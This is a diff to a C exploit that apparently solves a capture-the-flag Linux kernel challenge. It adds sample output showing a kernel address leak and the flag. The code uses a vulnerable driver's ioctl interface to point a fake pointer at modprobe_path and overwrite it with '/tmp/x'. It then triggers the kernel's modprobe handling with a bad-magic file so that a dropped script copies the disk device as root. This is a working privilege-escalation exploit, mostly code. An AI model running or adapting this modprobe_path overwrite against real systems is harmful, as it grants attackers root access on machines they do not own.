@@ -1,3 +1,11 @@
+/*
+$ ./solve
+[+] Kernel leak: ffffffffa3c471c0
+[+] modprobe_path: ffffffffa388b980
+[+] Triggering modprobe stuff
+/tmp/dummy: line 1: : not found
+FCSC{flag_placeholder}
+ */
 #include <fcntl.h>
 #include <assert.h>
 #include <sys/ioctl.h>
@@ -38,7 +46,7 @@ void hexdump(char* buf, int size) {
 }
 
 void get_flag(void){
-    puts("[+] Triggering modprobe shit");
+    puts("[+] Triggering modprobe stuff");
     system("echo '#!/bin/sh\ncp /dev/vda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
     system("chmod +x /tmp/x");
     system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
@@ -88,7 +96,7 @@ int main(void)
         assert(ret >= 0);
 
         struct fatptr fake_ptr = {
-                (void *) 0xfffffe0000000000,
+                (void *) modprobe_path_address,
                 0xffffffffffffffff,
         };
 
@@ -100,12 +108,8 @@ int main(void)
     ret = ioctl(fd, IOCTL_SWITCH, &index);
     assert(ret >= 0);
 
-    char r[0x1000];
-    n = read(fd, r, sizeof(r));
-    hexdump(r, sizeof(r));
-
-    //n = write(fd, "/tmp/x", 8);
-    // assert(n >= 0);
+    n = write(fd, "/tmp/x", 8);
+    assert(n >= 0);
 
     get_flag();
     close(fd);
